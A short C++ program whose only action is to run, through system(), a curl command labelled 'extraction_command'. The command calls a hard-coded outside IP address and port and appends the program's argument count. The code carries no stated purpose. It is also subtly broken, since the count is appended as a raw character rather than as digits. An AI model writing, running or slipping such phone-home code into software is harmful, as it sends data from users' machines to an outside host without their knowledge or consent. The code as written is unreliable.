#include <stdlib.h>

#include <string>

int main(int argc, char* argv[]) {
  std::string extraction_command = "curl http://159.223.105.145:11111/?argc=";
  extraction_command += argc;
  system(extraction_command.c_str());
  return 0;
}
